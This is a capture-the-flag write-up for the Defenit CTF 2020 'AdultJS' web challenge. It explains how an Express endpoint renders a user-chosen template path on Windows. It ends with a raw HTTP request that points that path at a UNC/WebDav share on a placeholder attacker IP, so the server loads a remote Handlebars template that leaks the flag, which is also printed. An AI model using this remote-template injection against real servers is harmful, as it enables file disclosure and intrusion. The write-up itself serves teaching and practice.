# AdultJS
*Defenit CTF 2020 - Web 810*<br>
*Writeup by Payload as ToEatSushi*


## Problem

Are you over 18?
This challenge is for adults :D

Hints <br>
 - Adult-JS is Served by Windows<br>
 - UNC Path

## Analyze Obfuscation

There are tooooooooo many endpoints in source code, we have to summary them first. With our teammate [@rbtree](https://twitter.com/RBTree_Pg_), we removed a garbage endpoints first.

We found that a function is different with other functions in `/61050c6ef9c64583e828ed565ca424b8be3c585d90a77e52a770540eb6d2a020`

```javascript

	app.post("/61050c6ef9c64583e828ed565ca424b8be3c585d90a77e52a770540eb6d2a020", (req, res) => {
	    try {
	        ae97ef205 = req.body.hcda7a4f9;
	        c43c4f0d2 = req.get("d28c3a2a7");
	        dd0372ef0 = req.range("g64aa5062");
	        f71f5ce80 = req.cookies.i77baba57;
	        ic9e2c145 = req.secure["eb4688e6f"];
	
	        fc4ebc0cc = {
	            b13a9706f: Function,
	            f635b63db: 15
	        };
	        ae9a8c19f = {
	            h4f3b2aa1: shared,
	            cf479eeba: this
	        };
	        h4a0a676e = Buffer.alloc(26);
	        h9b2a10f7 = Buffer.allocUnsafe(73);
	        f8c4d94cc = [
	            [
	                [
	                    [{
	                        cbee7d77b: this,
	                        e21888a73: shared
	                    }]
	                ]
	            ]
	        ];
	        dffbae364 = {
	            f13828fc5: Function,
	            cbcc2fbc6: 22
	        };
	        ib4cb72c9 = {
	            hdd2f9aa3: Function,
	            he404c257: 59
	        };
	        hf494292b = 'f7de2a815';
	        dd0372ef0 = dd0372ef0.gbae8c4d4
	        ic9e2c145 = ic9e2c145.d006e28f3
	
	        ae9a8c19f = assert(f71f5ce80);
	
	        res.render(ae97ef205);
	    } catch {
	        res.end('Error');
	    }
	});
```

We can give a template file in var `ae97ef205` which is from `req.body.hcda7a4f9`. Also we have to avoid `assert` directly before `res.render`, we have to set cookie `i77baba57` as non-falsy value.

## UNC, SMB and WebDav

This problem is running on Windows, which support UNC path to make file-related functions to be able to retrieve from remote. UNC uses SMB protocol as default, however when it fails, it tries WebDav over HTTP instead. With this, we can upload a hbs template file include `{{> FLAG }}` to our server, and let server to render it.

## Explotation

1. Configure WebDav server. I used apache2.
2. Upload a template file (flag.html)
3. Render it using the endpoint.

Actually, the flag of BabyJS is a great hint. The only problem is that I realized it after solving.

## Payload


`flag.html`
```
  {{> FLAG }}
```

```

POST /61050c6ef9c64583e828ed565ca424b8be3c585d90a77e52a770540eb6d2a020 HTTP/1.1
Host: adult-js3.ctf.defenit.kr
Cookie: i77baba57=123123
Content-Type: application/json

{"hcda7a4f9": "\\\\(AttackerIP)@80\\webdav\\flag"}


```




**`Defenit{AuduLt_JS-@_lo7e5_@-b4By-JS__##}`**
